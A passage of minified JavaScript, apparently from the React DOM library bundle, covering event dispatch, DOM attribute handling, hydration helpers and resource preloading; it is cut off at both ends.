KS:ue=O;break;case"scroll":case"scrollend":ue=yu;break;case"wheel":ue=le;break;case"copy":case"cut":case"paste":ue=tm;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":ue=vo;break;case"toggle":case"beforetoggle":ue=Ze}var Fe=(s&4)!==0,Da=!Fe&&(o==="scroll"||o==="scrollend"),ae=Fe?se!==null?se+"Capture":null:se;Fe=[];for(var $=oe,ie;$!==null;){var ge=$;if(ie=ge.stateNode,ge=ge.tag,ge!==5&&ge!==26&&ge!==27||ie===null||ae===null||(ge=li($,ae),ge!=null&&Fe.push(Yu($,ge,ie))),Da)break;$=$.return}0<Fe.length&&(se=new ue(se,Me,null,c,he),be.push({event:se,listeners:Fe}))}}if((s&7)===0){e:{if(se=o==="mouseover"||o==="pointerover",ue=o==="mouseout"||o==="pointerout",se&&c!==gu&&(Me=c.relatedTarget||c.fromElement)&&(qi(Me)||Me[Ni]))break e;if((ue||se)&&(se=he.window===he?he:(se=he.ownerDocument)?se.defaultView||se.parentWindow:window,ue?(Me=c.relatedTarget||c.toElement,ue=oe,Me=Me?qi(Me):null,Me!==null&&(Da=r(Me),Fe=Me.tag,Me!==Da||Fe!==5&&Fe!==27&&Fe!==6)&&(Me=null)):(ue=null,Me=oe),ue!==Me)){if(Fe=Eu,ge="onMouseLeave",ae="onMouseEnter",$="mouse",(o==="pointerout"||o==="pointerover")&&(Fe=vo,ge="onPointerLeave",ae="onPointerEnter",$="pointer"),Da=ue==null?se:yn(ue),ie=Me==null?se:yn(Me),se=new Fe(ge,$+"leave",ue,c,he),se.target=Da,se.relatedTarget=ie,ge=null,qi(he)===oe&&(Fe=new Fe(ae,$+"enter",Me,c,he),Fe.target=ie,Fe.relatedTarget=Da,ge=Fe),Da=ge,ue&&Me)a:{for(Fe=gk,ae=ue,$=Me,ie=0,ge=ae;ge;ge=Fe(ge))ie++;ge=0;for(var Ue=$;Ue;Ue=Fe(Ue))ge++;for(;0<ie-ge;)ae=Fe(ae),ie--;for(;0<ge-ie;)$=Fe($),ge--;for(;ie--;){if(ae===$||$!==null&&ae===$.alternate){Fe=ae;break a}ae=Fe(ae),$=Fe($)}Fe=null}else Fe=null;ue!==null&&vx(be,se,ue,Fe,!1),Me!==null&&Da!==null&&vx(be,Da,Me,Fe,!0)}}e:{if(se=oe?yn(oe):window,ue=se.nodeName&&se.nodeName.toLowerCase(),ue==="select"||ue==="input"&&se.type==="file")var Ea=_S;else if(MS(se))if(qS)Ea=Lq;else{Ea=Aq;var qe=xq}else ue=se.nodeName,!ue||ue.toLowerCase()!=="input"||se.type!=="checkbox"&&se.type!=="radio"?oe&&Sl(oe.elementType)&&(Ea=_S):Ea=Pq;if(Ea&&(Ea=Ea(o,oe))){NS(be,Ea,c,he);break e}qe&&qe(o,se,oe),o==="focusout"&&oe&&se.type==="number"&&oe.memoizedProps.value!=null&&mu(se,"number",se.value)}switch(qe=oe?yn(oe):window,o){case"focusin":(MS(qe)||qe.contentEditable==="true")&&(Il=qe,kg=oe,Au=null);break;case"focusout":Au=kg=Il=null;break;case"mousedown":Og=!0;break;case"contextmenu":case"mouseup":case"dragend":Og=!1,HS(be,c,he);break;case"selectionchange":if(Iq)break;case"keydown":case"keyup":HS(be,c,he)}var aa;if(Ca)e:{switch(o){case"compositionstart":var ca="onCompositionStart";break e;case"compositionend":ca="onCompositionEnd";break e;case"compositionupdate":ca="onCompositionUpdate";break e}ca=void 0}else Rl?Tr(o,c)&&(ca="onCompositionEnd"):o==="keydown"&&c.keyCode===229&&(ca="onCompositionStart");ca&&(Qi&&c.locale!=="ko"&&(Rl||ca!=="onCompositionStart"?ca==="onCompositionEnd"&&Rl&&(aa=vu()):(Fi=he,bu="value"in Fi?Fi.value:Fi.textContent,Rl=!0)),qe=Xm(oe,ca),0<qe.length&&(ca=new Gi(ca,o,null,c,he),be.push({event:ca,listeners:qe}),aa?ca.data=aa:(aa=Ll(c),aa!==null&&(ca.data=aa)))),(aa=On?Eq(o,c):Sq(o,c))&&(ca=Xm(oe,"onBeforeInput"),0<ca.length&&(qe=new Gi("onBeforeInput","beforeinput",null,c,he),be.push({event:qe,listeners:ca}),qe.data=aa)),pk(be,o,oe,c,he)}gx(be,s)})}function Yu(o,s,c){return{instance:o,listener:s,currentTarget:c}}function Xm(o,s){for(var c=s+"Capture",m=[];o!==null;){var v=o,y=v.stateNode;if(v=v.tag,v!==5&&v!==26&&v!==27||y===null||(v=li(o,c),v!=null&&m.unshift(Yu(o,v,y)),v=li(o,s),v!=null&&m.push(Yu(o,v,y))),o.tag===3)return m;o=o.return}return[]}function gk(o){if(o===null)return null;do o=o.return;while(o&&o.tag!==5&&o.tag!==27);return o||null}function vx(o,s,c,m,v){for(var y=s._reactName,x=[];c!==null&&c!==m;){var D=c,K=D.alternate,oe=D.stateNode;if(D=D.tag,K!==null&&K===m)break;D!==5&&D!==26&&D!==27||oe===null||(K=oe,v?(oe=li(c,y),oe!=null&&x.unshift(Yu(c,oe,K))):v||(oe=li(c,y),oe!=null&&x.push(Yu(c,oe,K)))),c=c.return}x.length!==0&&o.push({event:s,listeners:x})}var bk=/\r\n?/g,vk=/\u0000|\uFFFD/g;function yx(o){return(typeof o=="string"?o:""+o).replace(bk,`
`).replace(vk,"")}function Ex(o,s){return s=yx(s),yx(o)===s}function ja(o,s,c,m,v,y){switch(c){case"children":typeof m=="string"?s==="body"||s==="textarea"&&m===""||rn(o,m):(typeof m=="number"||typeof m=="bigint")&&s!=="body"&&rn(o,""+m);break;case"className":En(o,"class",m);break;case"tabIndex":En(o,"tabindex",m);break;case"dir":case"role":case"viewBox":case"width":case"height":En(o,c,m);break;case"style":hu(o,m,y);break;case"data":if(s!=="object"){En(o,"data",m);break}case"src":case"href":if(m===""&&(s!=="a"||c!=="href")){o.removeAttribute(c);break}if(m==null||typeof m=="function"||typeof m=="symbol"||typeof m=="boolean"){o.removeAttribute(c);break}m=Cl(""+m),o.setAttribute(c,m);break;case"action":case"formAction":if(typeof m=="function"){o.setAttribute(c,"javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')");break}else typeof y=="function"&&(c==="formAction"?(s!=="input"&&ja(o,s,"name",v.name,v,null),ja(o,s,"formEncType",v.formEncType,v,null),ja(o,s,"formMethod",v.formMethod,v,null),ja(o,s,"formTarget",v.formTarget,v,null)):(ja(o,s,"encType",v.encType,v,null),ja(o,s,"method",v.method,v,null),ja(o,s,"target",v.target,v,null)));if(m==null||typeof m=="symbol"||typeof m=="boolean"){o.removeAttribute(c);break}m=Cl(""+m),o.setAttribute(c,m);break;case"onClick":m!=null&&(o.onclick=ri);break;case"onScroll":m!=null&&oa("scroll",o);break;case"onScrollEnd":m!=null&&oa("scrollend",o);break;case"dangerouslySetInnerHTML":if(m!=null){if(typeof m!="object"||!("__html"in m))throw Error(n(61));if(c=m.__html,c!=null){if(v.children!=null)throw Error(n(60));o.innerHTML=c}}break;case"multiple":o.multiple=m&&typeof m!="function"&&typeof m!="symbol";break;case"muted":o.muted=m&&typeof m!="function"&&typeof m!="symbol";break;case"suppressContentEditableWarning":case"suppressHydrationWarning":case"defaultValue":case"defaultChecked":case"innerHTML":case"ref":break;case"autoFocus":break;case"xlinkHref":if(m==null||typeof m=="function"||typeof m=="boolean"||typeof m=="symbol"){o.removeAttribute("xlink:href");break}c=Cl(""+m),o.setAttributeNS("http://www.w3.org/1999/xlink","xlink:href",c);break;case"contentEditable":case"spellCheck":case"draggable":case"value":case"autoReverse":case"externalResourcesRequired":case"focusable":case"preserveAlpha":m!=null&&typeof m!="function"&&typeof m!="symbol"?o.setAttribute(c,""+m):o.removeAttribute(c);break;case"inert":case"allowFullScreen":case"async":case"autoPlay":case"controls":case"default":case"defer":case"disabled":case"disablePictureInPicture":case"disableRemotePlayback":case"formNoValidate":case"hidden":case"loop":case"noModule":case"noValidate":case"open":case"playsInline":case"readOnly":case"required":case"reversed":case"scoped":case"seamless":case"itemScope":m&&typeof m!="function"&&typeof m!="symbol"?o.setAttribute(c,""):o.removeAttribute(c);break;case"capture":case"download":m===!0?o.setAttribute(c,""):m!==!1&&m!=null&&typeof m!="function"&&typeof m!="symbol"?o.setAttribute(c,m):o.removeAttribute(c);break;case"cols":case"rows":case"size":case"span":m!=null&&typeof m!="function"&&typeof m!="symbol"&&!isNaN(m)&&1<=m?o.setAttribute(c,m):o.removeAttribute(c);break;case"rowSpan":case"start":m==null||typeof m=="function"||typeof m=="symbol"||isNaN(m)?o.removeAttribute(c):o.setAttribute(c,m);break;case"popover":oa("beforetoggle",o),oa("toggle",o),yl(o,"popover",m);break;case"xlinkActuate":st(o,"http://www.w3.org/1999/xlink","xlink:actuate",m);break;case"xlinkArcrole":st(o,"http://www.w3.org/1999/xlink","xlink:arcrole",m);break;case"xlinkRole":st(o,"http://www.w3.org/1999/xlink","xlink:role",m);break;case"xlinkShow":st(o,"http://www.w3.org/1999/xlink","xlink:show",m);break;case"xlinkTitle":st(o,"http://www.w3.org/1999/xlink","xlink:title",m);break;case"xlinkType":st(o,"http://www.w3.org/1999/xlink","xlink:type",m);break;case"xmlBase":st(o,"http://www.w3.org/XML/1998/namespace","xml:base",m);break;case"xmlLang":st(o,"http://www.w3.org/XML/1998/namespace","xml:lang",m);break;case"xmlSpace":st(o,"http://www.w3.org/XML/1998/namespace","xml:space",m);break;case"is":yl(o,"is",m);break;case"innerText":case"textContent":break;default:(!(2<c.length)||c[0]!=="o"&&c[0]!=="O"||c[1]!=="n"&&c[1]!=="N")&&(c=Xp.get(c)||c,yl(o,c,m))}}function cv(o,s,c,m,v,y){switch(c){case"style":hu(o,m,y);break;case"dangerouslySetInnerHTML":if(m!=null){if(typeof m!="object"||!("__html"in m))throw Error(n(61));if(c=m.__html,c!=null){if(v.children!=null)throw Error(n(60));o.innerHTML=c}}break;case"children":typeof m=="string"?rn(o,m):(typeof m=="number"||typeof m=="bigint")&&rn(o,""+m);break;case"onScroll":m!=null&&oa("scroll",o);break;case"onScrollEnd":m!=null&&oa("scrollend",o);break;case"onClick":m!=null&&(o.onclick=ri);break;case"suppressContentEditableWarning":case"suppressHydrationWarning":case"innerHTML":case"ref":break;case"innerText":case"textContent":break;default:if(!lu.hasOwnProperty(c))e:{if(c[0]==="o"&&c[1]==="n"&&(v=c.endsWith("Capture"),s=c.slice(2,v?c.length-7:void 0),y=o[Tt]||null,y=y!=null?y[c]:null,typeof y=="function"&&o.removeEventListener(s,y,v),typeof m=="function")){typeof y!="function"&&y!==null&&(c in o?o[c]=null:o.hasAttribute(c)&&o.removeAttribute(c)),o.addEventListener(s,m,v);break e}c in o?o[c]=m:m===!0?o.setAttribute(c,""):yl(o,c,m)}}}function qt(o,s,c){switch(s){case"div":case"span":case"svg":case"path":case"a":case"g":case"p":case"li":break;case"img":oa("error",o),oa("load",o);var m=!1,v=!1,y;for(y in c)if(c.hasOwnProperty(y)){var x=c[y];if(x!=null)switch(y){case"src":m=!0;break;case"srcSet":v=!0;break;case"children":case"dangerouslySetInnerHTML":throw Error(n(137,s));default:ja(o,s,y,x,c,null)}}v&&ja(o,s,"srcSet",c.srcSet,c,null),m&&ja(o,s,"src",c.src,c,null);return;case"input":oa("invalid",o);var D=y=x=v=null,K=null,oe=null;for(m in c)if(c.hasOwnProperty(m)){var he=c[m];if(he!=null)switch(m){case"name":v=he;break;case"type":x=he;break;case"checked":K=he;break;case"defaultChecked":oe=he;break;case"value":y=he;break;case"defaultValue":D=he;break;case"children":case"dangerouslySetInnerHTML":if(he!=null)throw Error(n(137,s));break;default:ja(o,s,m,he,c,null)}}Kp(o,y,D,K,oe,x,v,!1);return;case"select":oa("invalid",o),m=x=y=null;for(v in c)if(c.hasOwnProperty(v)&&(D=c[v],D!=null))switch(v){case"value":y=D;break;case"defaultValue":x=D;break;case"multiple":m=D;default:ja(o,s,v,D,c,null)}s=y,c=x,o.multiple=!!m,s!=null?as(o,!!m,s,!1):c!=null&&as(o,!!m,c,!0);return;case"textarea":oa("invalid",o),y=v=m=null;for(x in c)if(c.hasOwnProperty(x)&&(D=c[x],D!=null))switch(x){case"value":m=D;break;case"defaultValue":v=D;break;case"children":y=D;break;case"dangerouslySetInnerHTML":if(D!=null)throw Error(n(91));break;default:ja(o,s,x,D,c,null)}ts(o,m,v,y);return;case"option":for(K in c)c.hasOwnProperty(K)&&(m=c[K],m!=null)&&(K==="selected"?o.selected=m&&typeof m!="function"&&typeof m!="symbol":ja(o,s,K,m,c,null));return;case"dialog":oa("beforetoggle",o),oa("toggle",o),oa("cancel",o),oa("close",o);break;case"iframe":case"object":oa("load",o);break;case"video":case"audio":for(m=0;m<Ku.length;m++)oa(Ku[m],o);break;case"image":oa("error",o),oa("load",o);break;case"details":oa("toggle",o);break;case"embed":case"source":case"link":oa("error",o),oa("load",o);case"area":case"base":case"br":case"col":case"hr":case"keygen":case"meta":case"param":case"track":case"wbr":case"menuitem":for(oe in c)if(c.hasOwnProperty(oe)&&(m=c[oe],m!=null))switch(oe){case"children":case"dangerouslySetInnerHTML":throw Error(n(137,s));default:ja(o,s,oe,m,c,null)}return;default:if(Sl(s)){for(he in c)c.hasOwnProperty(he)&&(m=c[he],m!==void 0&&cv(o,s,he,m,c,void 0));return}}for(D in c)c.hasOwnProperty(D)&&(m=c[D],m!=null&&ja(o,s,D,m,c,null))}function yk(o,s,c,m){switch(s){case"div":case"span":case"svg":case"path":case"a":case"g":case"p":case"li":break;case"input":var v=null,y=null,x=null,D=null,K=null,oe=null,he=null;for(ue in c){var be=c[ue];if(c.hasOwnProperty(ue)&&be!=null)switch(ue){case"checked":break;case"value":break;case"defaultValue":K=be;default:m.hasOwnProperty(ue)||ja(o,s,ue,null,m,be)}}for(var se in m){var ue=m[se];if(be=c[se],m.hasOwnProperty(se)&&(ue!=null||be!=null))switch(se){case"type":y=ue;break;case"name":v=ue;break;case"checked":oe=ue;break;case"defaultChecked":he=ue;break;case"value":x=ue;break;case"defaultValue":D=ue;break;case"children":case"dangerouslySetInnerHTML":if(ue!=null)throw Error(n(137,s));break;default:ue!==be&&ja(o,s,se,ue,m,be)}}El(o,x,D,K,oe,he,y,v);return;case"select":ue=x=D=se=null;for(y in c)if(K=c[y],c.hasOwnProperty(y)&&K!=null)switch(y){case"value":break;case"multiple":ue=K;default:m.hasOwnProperty(y)||ja(o,s,y,null,m,K)}for(v in m)if(y=m[v],K=c[v],m.hasOwnProperty(v)&&(y!=null||K!=null))switch(v){case"value":se=y;break;case"defaultValue":D=y;break;case"multiple":x=y;default:y!==K&&ja(o,s,v,y,m,K)}s=D,c=x,m=ue,se!=null?as(o,!!c,se,!1):!!m!=!!c&&(s!=null?as(o,!!c,s,!0):as(o,!!c,c?[]:"",!1));return;case"textarea":ue=se=null;for(D in c)if(v=c[D],c.hasOwnProperty(D)&&v!=null&&!m.hasOwnProperty(D))switch(D){case"value":break;case"children":break;default:ja(o,s,D,null,m,v)}for(x in m)if(v=m[x],y=c[x],m.hasOwnProperty(x)&&(v!=null||y!=null))switch(x){case"value":se=v;break;case"defaultValue":ue=v;break;case"children":break;case"dangerouslySetInnerHTML":if(v!=null)throw Error(n(91));break;default:v!==y&&ja(o,s,x,v,m,y)}Yp(o,se,ue);return;case"option":for(var Me in c)se=c[Me],c.hasOwnProperty(Me)&&se!=null&&!m.hasOwnProperty(Me)&&(Me==="selected"?o.selected=!1:ja(o,s,Me,null,m,se));for(K in m)se=m[K],ue=c[K],m.hasOwnProperty(K)&&se!==ue&&(se!=null||ue!=null)&&(K==="selected"?o.selected=se&&typeof se!="function"&&typeof se!="symbol":ja(o,s,K,se,m,ue));return;case"img":case"link":case"area":case"base":case"br":case"col":case"embed":case"hr":case"keygen":case"meta":case"param":case"source":case"track":case"wbr":case"menuitem":for(var Fe in c)se=c[Fe],c.hasOwnProperty(Fe)&&se!=null&&!m.hasOwnProperty(Fe)&&ja(o,s,Fe,null,m,se);for(oe in m)if(se=m[oe],ue=c[oe],m.hasOwnProperty(oe)&&se!==ue&&(se!=null||ue!=null))switch(oe){case"children":case"dangerouslySetInnerHTML":if(se!=null)throw Error(n(137,s));break;default:ja(o,s,oe,se,m,ue)}return;default:if(Sl(s)){for(var Da in c)se=c[Da],c.hasOwnProperty(Da)&&se!==void 0&&!m.hasOwnProperty(Da)&&cv(o,s,Da,void 0,m,se);for(he in m)se=m[he],ue=c[he],!m.hasOwnProperty(he)||se===ue||se===void 0&&ue===void 0||cv(o,s,he,se,m,ue);return}}for(var ae in c)se=c[ae],c.hasOwnProperty(ae)&&se!=null&&!m.hasOwnProperty(ae)&&ja(o,s,ae,null,m,se);for(be in m)se=m[be],ue=c[be],!m.hasOwnProperty(be)||se===ue||se==null&&ue==null||ja(o,s,be,se,m,ue)}function Sx(o){switch(o){case"css":case"script":case"font":case"img":case"image":case"input":case"link":return!0;default:return!1}}function Ek(){if(typeof performance.getEntriesByType=="function"){for(var o=0,s=0,c=performance.getEntriesByType("resource"),m=0;m<c.length;m++){var v=c[m],y=v.transferSize,x=v.initiatorType,D=v.duration;if(y&&D&&Sx(x)){for(x=0,D=v.responseEnd,m+=1;m<c.length;m++){var K=c[m],oe=K.startTime;if(oe>D)break;var he=K.transferSize,be=K.initiatorType;he&&Sx(be)&&(K=K.responseEnd,x+=he*(K<D?1:(D-oe)/(K-oe)))}if(--m,s+=8*(y+x)/(v.duration/1e3),o++,10<o)break}}if(0<o)return s/o/1e6}return navigator.connection&&(o=navigator.connection.downlink,typeof o=="number")?o:5}var uv=null,dv=null;function Zm(o){return o.nodeType===9?o:o.ownerDocument}function Cx(o){switch(o){case"http://www.w3.org/2000/svg":return 1;case"http://www.w3.org/1998/Math/MathML":return 2;default:return 0}}function Tx(o,s){if(o===0)switch(s){case"svg":return 1;case"math":return 2;default:return 0}return o===1&&s==="foreignObject"?0:o}function pv(o,s){return o==="textarea"||o==="noscript"||typeof s.children=="string"||typeof s.children=="number"||typeof s.children=="bigint"||typeof s.dangerouslySetInnerHTML=="object"&&s.dangerouslySetInnerHTML!==null&&s.dangerouslySetInnerHTML.__html!=null}var mv=null;function Sk(){var o=window.event;return o&&o.type==="popstate"?o===mv?!1:(mv=o,!0):(mv=null,!1)}var xx=typeof setTimeout=="function"?setTimeout:void 0,Ck=typeof clearTimeout=="function"?clearTimeout:void 0,Ax=typeof Promise=="function"?Promise:void 0,Tk=typeof queueMicrotask=="function"?queueMicrotask:typeof Ax<"u"?function(o){return Ax.resolve(null).then(o).catch(xk)}:xx;function xk(o){setTimeout(function(){throw o})}function As(o){return o==="head"}function Px(o,s){var c=s,m=0;do{var v=c.nextSibling;if(o.removeChild(c),v&&v.nodeType===8)if(c=v.data,c==="/$"||c==="/&"){if(m===0){o.removeChild(v),tc(s);return}m--}else if(c==="$"||c==="$?"||c==="$~"||c==="$!"||c==="&")m++;else if(c==="html")$u(o.ownerDocument.documentElement);else if(c==="head"){c=o.ownerDocument.head,$u(c);for(var y=c.firstChild;y;){var x=y.nextSibling,D=y.nodeName;y[_i]||D==="SCRIPT"||D==="STYLE"||D==="LINK"&&y.rel.toLowerCase()==="stylesheet"||c.removeChild(y),y=x}}else c==="body"&&$u(o.ownerDocument.body);c=v}while(c);tc(s)}function Lx(o,s){var c=o;o=0;do{var m=c.nextSibling;if(c.nodeType===1?s?(c._stashedDisplay=c.style.display,c.style.display="none"):(c.style.display=c._stashedDisplay||"",c.getAttribute("style")===""&&c.removeAttribute("style")):c.nodeType===3&&(s?(c._stashedText=c.nodeValue,c.nodeValue=""):c.nodeValue=c._stashedText||""),m&&m.nodeType===8)if(c=m.data,c==="/$"){if(o===0)break;o--}else c!=="$"&&c!=="$?"&&c!=="$~"&&c!=="$!"||o++;c=m}while(c)}function fv(o){var s=o.firstChild;for(s&&s.nodeType===10&&(s=s.nextSibling);s;){var c=s;switch(s=s.nextSibling,c.nodeName){case"HTML":case"HEAD":case"BODY":fv(c),vl(c);continue;case"SCRIPT":case"STYLE":continue;case"LINK":if(c.rel.toLowerCase()==="stylesheet")continue}o.removeChild(c)}}function Ak(o,s,c,m){for(;o.nodeType===1;){var v=c;if(o.nodeName.toLowerCase()!==s.toLowerCase()){if(!m&&(o.nodeName!=="INPUT"||o.type!=="hidden"))break}else if(m){if(!o[_i])switch(s){case"meta":if(!o.hasAttribute("itemprop"))break;return o;case"link":if(y=o.getAttribute("rel"),y==="stylesheet"&&o.hasAttribute("data-precedence"))break;if(y!==v.rel||o.getAttribute("href")!==(v.href==null||v.href===""?null:v.href)||o.getAttribute("crossorigin")!==(v.crossOrigin==null?null:v.crossOrigin)||o.getAttribute("title")!==(v.title==null?null:v.title))break;return o;case"style":if(o.hasAttribute("data-precedence"))break;return o;case"script":if(y=o.getAttribute("src"),(y!==(v.src==null?null:v.src)||o.getAttribute("type")!==(v.type==null?null:v.type)||o.getAttribute("crossorigin")!==(v.crossOrigin==null?null:v.crossOrigin))&&y&&o.hasAttribute("async")&&!o.hasAttribute("itemprop"))break;return o;default:return o}}else if(s==="input"&&o.type==="hidden"){var y=v.name==null?null:""+v.name;if(v.type==="hidden"&&o.getAttribute("name")===y)return o}else return o;if(o=Gn(o.nextSibling),o===null)break}return null}function Pk(o,s,c){if(s==="")return null;for(;o.nodeType!==3;)if((o.nodeType!==1||o.nodeName!=="INPUT"||o.type!=="hidden")&&!c||(o=Gn(o.nextSibling),o===null))return null;return o}function Rx(o,s){for(;o.nodeType!==8;)if((o.nodeType!==1||o.nodeName!=="INPUT"||o.type!=="hidden")&&!s||(o=Gn(o.nextSibling),o===null))return null;return o}function hv(o){return o.data==="$?"||o.data==="$~"}function gv(o){return o.data==="$!"||o.data==="$?"&&o.ownerDocument.readyState!=="loading"}function Lk(o,s){var c=o.ownerDocument;if(o.data==="$~")o._reactRetry=s;else if(o.data!=="$?"||c.readyState!=="loading")s();else{var m=function(){s(),c.removeEventListener("DOMContentLoaded",m)};c.addEventListener("DOMContentLoaded",m),o._reactRetry=m}}function Gn(o){for(;o!=null;o=o.nextSibling){var s=o.nodeType;if(s===1||s===3)break;if(s===8){if(s=o.data,s==="$"||s==="$!"||s==="$?"||s==="$~"||s==="&"||s==="F!"||s==="F")break;if(s==="/$"||s==="/&")return null}}return o}var bv=null;function Ix(o){o=o.nextSibling;for(var s=0;o;){if(o.nodeType===8){var c=o.data;if(c==="/$"||c==="/&"){if(s===0)return Gn(o.nextSibling);s--}else c!=="$"&&c!=="$!"&&c!=="$?"&&c!=="$~"&&c!=="&"||s++}o=o.nextSibling}return null}function wx(o){o=o.previousSibling;for(var s=0;o;){if(o.nodeType===8){var c=o.data;if(c==="$"||c==="$!"||c==="$?"||c==="$~"||c==="&"){if(s===0)return o;s--}else c!=="/$"&&c!=="/&"||s++}o=o.previousSibling}return null}function jx(o,s,c){switch(s=Zm(c),o){case"html":if(o=s.documentElement,!o)throw Error(n(452));return o;case"head":if(o=s.head,!o)throw Error(n(453));return o;case"body":if(o=s.body,!o)throw Error(n(454));return o;default:throw Error(n(451))}}function $u(o){for(var s=o.attributes;s.length;)o.removeAttributeNode(s[0]);vl(o)}var Qn=new Map,Dx=new Set;function ef(o){return typeof o.getRootNode=="function"?o.getRootNode():o.nodeType===9?o:o.ownerDocument}var Mo=re.d;re.d={f:Rk,r:Ik,D:wk,C:jk,L:Dk,m:Mk,X:_k,S:Nk,M:qk};function Rk(){var o=Mo.f(),s=Gm();return o||s}function Ik(o){var s=_n(o);s!==null&&s.tag===5&&s.type==="form"?KC(s):Mo.r(o)}var Zl=typeof document>"u"?null:document;function Mx(o,s,c){var m=Zl;if(m&&typeof s=="string"&&s){var v=sn(s);v='link[rel="'+o+'"][href="'+v+'"]',typeof c=="string"&&(v+='[crossorigin="'+c+'"]'),Dx.has(v)||(Dx.add(v),o={rel:o,crossOrigin:c,href:s},m.querySelector(v)===null&&(s=m.createElement("link"),qt(s,"link",o),ot(s),m.head.appendChild(s)))}}function wk(o){Mo.D(o),Mx("dns-prefetch",o,null)}function jk(o,s){Mo.C(o,s),Mx("preconnect",o,s)}function Dk(o,s,c){Mo.L(o,s,c);var m=Zl;if(m&&o&&s){var v='link[rel="preload"][as="'+sn(s)+'"]';s==="image"&&c&&c.imageSrcSet?(v+='[imagesrcset="'+sn(c.imageSrcSet)+'"]',typeof c.imageSizes=="string"&&(v+='[imagesizes="'+sn(c.imageSizes)+'"]')):v+='[href="'+sn(o)+'"]';var y=v;switch(s){case"style":y=ec(o);break;case"script":y=ac(o)}Qn.has(y)||(o=h({rel:"preload",href:s==="image"&&c&&c.imageSrcSet?void 0:o,as:s},c),Qn.set(y,o),m.querySelector(v)!==null||s==="style"&&m.querySelector(Xu(y))||s==="script"&&m.querySelector(Zu(y))||(s=m.createElement("link"),qt(s,"link",o),ot(s),m.head.appendChild(s)))}}function Mk(o,s){Mo.m(o,s);var c=Zl;if(c&&o){var m=s&&typeof s.as=="string"?s.as:"script",v='link[rel="modulepreload"][as="'+sn(m)+'"][href="'+sn(o)+'"]',y=v;switch(m){case"audioworklet":case"paintworklet":case"serviceworker":case"sharedworker":case"worker":case"script":y=ac(o)}if(!Qn.has(y)&&(o=h({rel:"modulepreload",href:o},s),Qn.set(y,o),c.querySelector(v)===null)){switch(m){case"audioworklet":case"paintworklet":case"serviceworker":case"sharedworker":case"worker":case"script":if(c.querySelector(Zu(y)))return}m=c.createElement("link"),qt(m,"link",o),ot(m),c.head.appendChild(m)}}}function Nk(o,s,c){Mo.S(o,s,c);var m=Zl;if(m&&o){var v=ki(m).hoistableStyles,y=ec(o);s=s||"default";var x=v.get(y);if(!x){var D={loading:0,preload:null};if(x=m.querySelector(Xu(y)))D.loading=5;else{o=h({rel:"stylesheet",href:o,"data-precedence":s},c),(c=Qn.get(y))&&vv(o,c);var K=x=m.createElement("link");ot(K),qt(K,"link",o),K._p=new Promise(function(oe,he){K.onload=oe,K.onerror=he}),K.addEventListener("load",function(){D.loading|=1}),K.addEventListener("error",function(){D.loading|=2}),D.loading|=4,af(x,s,m)}x={type:"stylesheet",instance:x,count:1,state:D},v.set(y,x)}}}function _k(o,s){Mo.X(o,s);var c=Zl;if(c&&o){var m=ki(c).hoistableScripts,v=ac(o),y=m.get(v);y||(y=c.querySelector(Zu(v)),y||(o=h({src:o,async:!0},s),(s=Qn.get(v))&&yv(o,s),y=c.createElement("script"),ot(y),qt(y,"link",o),c.head.appendChild(y)),y={type:"script",instance:y,count:1,state:null},m.set(v,y))}}function qk(o,s){Mo.M(o,s);var c=Zl;if(c&&o){var m=ki(c).hoistableScripts,v=ac(o),y=m.get(v);y||(y=c.querySelector(Zu(v)),y||(o=h({src:o,async:!0,type:"module"},s),(s=Qn.get(v))&&yv(o,s),y=c.createElement("script"),ot(y),qt(y,"link",o),c.head.appendChild(y)),y={type:"script",instance:y,count:1,state:null},m.set(v,y))}}function Nx(o,s,c,m){var v=(v=_e.current)?ef(v):null;if(!v)throw Error(n(446));switch(o){case"meta":case"title":return null;case"style":return typeof c.precedence=="string"&&typeof c.href=="string"?(s=ec(c.href),c=ki(v).hoistableStyles,m=c.get(s),m||(m={type:"style",instance:null,count:0,state:null},c.set(s,m)),m):{type:"void",instance:null,count:0,state:null};case"link":if(c.rel==="stylesheet"&&typeof c.href=="string"&&typeof c.precedence=="string"){o=ec(c.href);var y=ki(v).hoistableStyles,x=y.get(o);if(x||(v=v.ownerDocument||v,x={type:"stylesheet",instance:null,count:0,state:{loading:0,preload:null}},y.set(o,x),(y=v.querySelector(Xu(o)))&&!y._p&&(x.instance=y,x.state.loading=5),Qn.has(o)||(c={rel:"preload",as:"style",href:c.href,crossOrigin:c.crossOrigin,integrity:c.integrity,media:c.media,hrefLang:c.hrefLang,referrerPolicy:c.referrerPolicy},Qn.set(o,c),y||kk(v,o,c,x.state))),s&&m===null)throw Error(n(528,""));return x}if(s&&m!==null)throw Error(n(529,""));return null;case"script":return s=c.async,c=c.src,typeof c=="string"&&s&&typeof s!="function"&&typeof s!="symbol"?(s=ac(c),c=ki(v).hoistableScripts,m=c.get(s),m||(m={type:"script",instance:null,count:0,state:null},c.set(s,m)),m):{type:"void",instance:null,count:0,state:null};default:throw Error(n(444,o))}}function ec(o){return'href="'+sn(o)+'"'}function Xu(o){return'link[rel="stylesheet"]['+o+"]"}function _x(o){return h({},o,{"data-precedence":o.precedence,precedence:null})}function kk(o,s,c,m){o.querySelector('link[rel="preload"][as="style"]['+s+"]")?m.loading=1:(s=o.createElement("link"),m.preload=s,s.addEventListener("load",function(){return m.loading|=1}),s.addEventListener("error",function(){return m.loading|=2}),qt(s,"link",c),ot(s),o.head.appendChild(s))}function ac(o){return'[src="'+sn(o)+'"]'}function Zu(o){return"script[async]"+o}function qx(o,s,c){if(s.count++,s.instance===null)switch(s.type){case"style":var m=o.querySelector('style[data-href~="'+sn(c.href)+'"]');if(m)return s.instance=m,ot(m),m;var v=h({},c,{"data-href":c.href,"data-precedence":c.precedence,href:null,precedence:null});return m=(o.ownerDocument||o).createElement("style"),ot(m),qt(m,"style",v),af(m,c.precedence,o),s.instance=m;case"stylesheet":v=ec(c.href);var y=o.querySelector(Xu(v));if(y)return s.state.loading|=4,s.instance=y,ot(y),y;m=_x(c),(v=Qn.get(v))&&vv(m,v),y=(o.ownerDocument||o).createElement("link"),ot(y);var x=y;return x._p=new Promise(function(D,K){x.onload=D,x.onerror=K}),qt(y,"link",m),s.state.loading|=4,af(y,c.precedence,o),s.instance=y;case"script":return 